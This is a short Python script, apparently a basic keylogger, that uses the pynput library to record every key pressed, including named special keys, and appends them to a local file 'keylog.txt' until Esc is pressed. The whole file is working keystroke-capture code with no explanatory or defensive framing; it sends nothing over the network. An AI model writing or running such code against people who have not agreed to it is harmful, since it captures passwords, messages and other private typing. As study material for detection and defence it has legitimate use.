from pynput import keyboard

LOG_FILE = "keylog.txt"

def write_log(key):
    with open(LOG_FILE, "a") as f:
        f.write(f"{key}\n")

def on_press(key):
    try:
        # For printable characters
        write_log(f"{key.char}")
    except AttributeError:
        # For special keys
        if key == keyboard.Key.space:
            write_log("[SPACE]")
        elif key == keyboard.Key.enter:
            write_log("[ENTER]")
        elif key == keyboard.Key.backspace:
            write_log("[BACKSPACE]")
        elif key == keyboard.Key.tab:
            write_log("[TAB]")
        else:
            write_log(f"[{key.name.upper()}]")

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop listener

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
